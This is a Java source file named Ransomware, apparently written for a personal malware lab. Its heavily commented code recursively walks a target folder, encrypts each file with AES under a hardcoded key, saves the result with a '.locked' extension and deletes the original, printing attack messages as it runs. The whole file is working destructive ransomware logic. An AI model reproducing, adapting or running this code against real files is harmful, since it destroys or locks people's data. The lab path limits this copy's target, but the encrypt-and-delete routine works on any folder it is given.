import java.io.File;              // Represents file and directory (folder) paths, and handles file deletion
import java.io.FileInputStream;   // Reads raw binary data (bytes) from a file on the system
import java.io.FileOutputStream;  // Writes raw binary data (bytes) into a new or existing file
import javax.crypto.Cipher;       // Core Java class that performs the actual AES encryption and decryption
import javax.crypto.spec.SecretKeySpec; // Converts a plain byte array (our password) into a valid cryptographic AES key

public class Ransomware {
    
    // 1. AES Encryption Key (A strong cryptographic lock)
    // This secret key must be exactly 16 characters (16 bytes = 128-bit AES key)
    private static final String SECRET_KEY = "BankaiGetsuga123"; 

    public static void main(String[] args) {
        // Path of the target folder where files are stored
        String targetPath = "C:\\Users\\Henil Prajapati\\OneDrive\\Documents\\Malware_Lab\\Target_Data";
        
        // Create a File object that points to the target directory path
        File targetFolder = new File(targetPath);

        System.out.println("⚠️ Ransomware Attack Started...");
        
        // Start the spider method to scan and process the target folder
        attackSpider(targetFolder);
        
        System.out.println("💀 All files have been successfully locked!");
    }

    // 2. Spider Logic (Directory Traversal - scanning folders and subfolders)
    static void attackSpider(File folder) {
        // Get an array of all files and folders present inside the current directory
        File[] files = folder.listFiles();
        
        // If the folder is empty or cannot be accessed, stop and go back
        if (files == null) return;

        // Loop through every file and subfolder one by one
        for (File file : files) {
            if (file.isDirectory()) {
                // If there is another folder inside this folder, go inside it too (Recursion)
                attackSpider(file); 
            } else {
                // If it is a normal file and is not already locked, encrypt it
                if (!file.getName().endsWith(".locked")) {
                    encryptAndLock(file);
                }
            }
        }
    }

    // 3. Byte-Level File I/O & AES Encryption Logic
    static void encryptAndLock(File file) {
        try {
            // A. Prepare the AES encryption lock
            // Convert the 16-character string key into raw bytes and format it for AES
            SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), "AES");
            
            // Create a Cipher object configured to use the AES algorithm
            Cipher cipher = Cipher.getInstance("AES");
            
            // Initialize the cipher in ENCRYPT_MODE (lock mode) using our secret key
            cipher.init(Cipher.ENCRYPT_MODE, keySpec);

            // B. Read the original binary data (raw bytes) of the file
            // Open an input stream to read data from the original file
            FileInputStream inputStream = new FileInputStream(file);
            
            // Create an empty byte array matching the exact size of the file
            byte[] inputBytes = new byte[(int) file.length()];
            
            // Read all bytes from the file and store them into inputBytes
            inputStream.read(inputBytes);
            
            // Close the input stream to release the file from memory
            inputStream.close();

            // C. Encrypt (scramble) the data using AES
            // Process the original bytes and generate encrypted unreadable bytes
            byte[] outputBytes = cipher.doFinal(inputBytes);

            // D. Create a new '.locked' file and save the encrypted data inside it
            // Define the new file path by adding ".locked" at the end of the original path
            File lockedFile = new File(file.getAbsolutePath() + ".locked");
            
            // Open an output stream to write data into the new '.locked' file
            FileOutputStream outputStream = new FileOutputStream(lockedFile);
            
            // Write the encrypted bytes into the new file
            outputStream.write(outputBytes);
            
            // Close the output stream to save changes properly
            outputStream.close();

            // Delete the original unencrypted file from the computer
            file.delete();

        } 
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}